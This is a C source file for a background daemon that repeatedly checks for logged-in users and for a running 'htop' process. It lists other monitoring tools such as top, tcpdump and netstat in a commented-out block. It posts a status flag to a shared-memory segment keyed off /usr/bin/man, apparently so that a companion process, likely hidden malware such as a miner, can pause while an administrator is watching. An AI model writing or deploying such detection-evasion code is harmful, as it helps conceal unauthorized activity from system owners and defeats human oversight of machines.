#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/time.h>
#include <dirent.h>
#include <utmp.h>
#include <pwd.h>

const char *wlist[] = {
    "htop",
    /*
    "top",
    "tcpdump",
    "netstat",
    "iotop",
    "iostat",
    "iftop",
    */
};

int linux_sys_scan_sessions()
{
    int rv = -1;

    struct utmp *u;
    while ((u=getutent())) {
        if (-1 == rv) {
            rv = 0;
        }
        if (u->ut_type == USER_PROCESS) {
            rv = 1;
            break;
        }
    }

    endutent();
    return rv;
}

int linux_sys_scan_workers()
{
    DIR* dir;
    struct dirent* ent;
    char* endptr;
    char buf[128];

    if (!(dir = opendir("/proc"))) {
        return -1;
    }

    int wlists = sizeof(wlist)/sizeof(wlist[0]);

    while ((ent = readdir(dir)) != NULL) {
        long lpid = strtol(ent->d_name, &endptr, 10);
        if (*endptr != '\0') {
            continue;
        }

        snprintf(buf, sizeof(buf), "/proc/%ld/comm", lpid);

        FILE* fp = fopen(buf, "r");
        if (fp) {
            if (fgets(buf, sizeof(buf), fp) != NULL) {
                int id = 0;
                for (id = 0; id < wlists; ++id) {
                    const char *name = wlist[id];
                    if (0 == strncmp(buf, name, strlen(buf)-1)) {
                        fclose(fp);
                        closedir(dir);
                        return 1;
                    }
                }
            }
            fclose(fp);
        }
    }

    closedir(dir);
    return 0;
}

void linux_sys_release_id(int shmid)
{
    if (-1 != shmid) {
        shmctl(shmid, IPC_RMID, NULL);
    }
}

int linux_sys_get_id(int shmid)
{
    key_t key = ftok("/usr/bin/man", 59231);

    int cur_shmid = shmget(key, 0, 0);
    if (-1 == cur_shmid) {
        if (-1 != shmid && cur_shmid != shmid) {
            // 兼容逻辑: 防止man文件被删除或者替换, 分配了越来越多的共享内存
            linux_sys_release_id(shmid);
        }

        cur_shmid = shmget(key, 128, IPC_CREAT|0666|IPC_EXCL);
        if (-1 == cur_shmid) {
            return -1;
        }
    }
    return cur_shmid;
}

int linux_sys_scan_flow(int shmid)
{
    int sleep_seconds = 1;
    int long_seconds = 5;

    // compitable with: del shm
    void *p = shmat(shmid, 0, 0);
    if ((void*)-1 == p) {
        sleep_seconds = long_seconds;
    }

    char value = 0;

    if (0 != linux_sys_scan_sessions()) {
        value = 1;
        sleep_seconds = long_seconds;
    }
    if (0 != linux_sys_scan_workers()) {
        value = 2;
        sleep_seconds = long_seconds;
    }

    struct timeval tval;
    gettimeofday(&tval, NULL);

    char *mflag = p;
    *mflag = value;

    int *timeflag = (int *)(mflag + 1);
    *timeflag = (int)tval.tv_sec;

    if (-1 == shmdt(p)) {
        sleep_seconds = long_seconds;
    }

    return sleep_seconds;
}

int main(int argc, const char **argv)
{
    if (daemon(0,0) == -1) {
        exit(0);
    }

    int shmid = -1;
    shmid = linux_sys_get_id(shmid);
    if (-1 == shmid) {
        return -1;
    }
    while (1) {
        int sleep_seconds = linux_sys_scan_flow(shmid);
        sleep(sleep_seconds);
    }
    linux_sys_release_id(shmid);

    return 0;
}

